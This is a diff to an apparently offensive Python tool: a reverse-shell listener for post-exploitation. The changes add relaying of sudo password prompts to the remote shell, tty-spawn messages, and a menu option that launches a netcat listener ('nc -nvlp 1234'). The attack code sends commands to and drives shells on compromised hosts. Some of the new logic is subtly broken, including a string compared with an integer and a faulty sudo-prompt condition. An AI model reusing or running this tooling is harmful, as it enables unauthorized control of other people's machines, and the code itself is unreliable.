@@ -229,9 +229,9 @@ def tty():
 			if shell in results:
 				break
 	if results == temp_shell:
-		print("Failed")
+		print("Session has not been changed")
 	else:
-		print("success")
+		print("tty spawned")
 		shell = results
 		command_pannel = False
 def start_listener(port):
@@ -264,6 +264,8 @@ def start_listener(port):
 		if command_pannel == False:
 			liste = []
 			command = input(shell)
+			if "sudo" in command.split(" "):
+				tty()
 			client_socket.send((command+"\n").encode())
 			if command.lower() == "#kill":
 				client_socket.send(("exit"+"\n").encode())
@@ -275,13 +277,21 @@ def start_listener(port):
 					print(i)
 			elif command.lower() == "exit":
 				break
+			sudo = False
 			while True:
 				results = client_socket.recv(buffer).decode()
 				for i in results.split("\n"):
 					if i!=command:
+						if "[sudo]" in i:
+							sudo = True
 						liste.append(i)
 				if shell in results:
 					break
+				if sudo == True:
+					if '[sudo]' and ":" in results:
+						password = input('Password >> ')
+						client_socket.send((password+"\n").encode())
+				sudo = False
 			while "" in liste:
 				liste.remove("")
 			print("\n".join(liste[:-1]))
@@ -374,7 +384,10 @@ else:
 
 if input("Would you like to start a listener ? y/n :").upper()=="Y":
 	try:
-		start_listener(port)
+		if input("1.Netcat (No Tools)\n2.Custom Listener (Post exploitation Tools)\nYour Choice :")==1:
+			os.system("nc -nvlp 1234")
+		else:
+			start_listener(port)
 	except KeyboardInterrupt:
 		print("Cancelled by user")
 else:
